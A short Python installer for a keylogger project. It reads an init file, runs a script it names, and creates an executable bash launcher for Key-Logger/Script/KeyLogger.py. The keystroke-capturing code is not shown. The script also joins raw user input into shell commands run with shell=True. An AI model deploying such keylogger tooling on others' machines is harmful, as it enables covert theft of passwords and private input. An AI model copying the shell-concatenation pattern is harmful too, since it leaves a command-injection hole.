import subprocess

s = "L"
DIR = input("Download-directory:")
print("")

""" File to string """

file = open(DIR + "Key-Logger/init/_init_.txt", 'r')
read = file.readlines()
file.close()

data = "".join(read)

count = 0
ok = 0

""" Serch the Word """

while ok < 1:
    index = data[count]
    count  += 1
    
    if index == s:
        one = count + 4
        ok = 1

count  += 4
stop = "false"        
liste = []

while stop == "false":
    index = data[count]
    liste.append(index)
    count  += 1
    if index == "$":
        stop = "true"
        
""" Outputs the Word """

output = "".join(liste)
output = output.replace("$", '')
print("Init: " + DIR + "Key-Logger/" + output)

com = open("dir.txt", 'w')
com.write("[F] = " + DIR + "Key-Logger/" +output + "$")
com.close()

print("")
subprocess.check_call("python3 " + DIR + "Key-Logger/" + output, shell=True)

main = open(DIR + "KeyL", 'w')
main.write("#!/bin/bash" + "\n")
main.close()

main = open(DIR + "KeyL", 'a')
main.write("python3 " + DIR + "Key-Logger/Script/KeyLogger.py")
main.close()

subprocess.check_call("chmod +x " + DIR + "KeyL", shell=True)
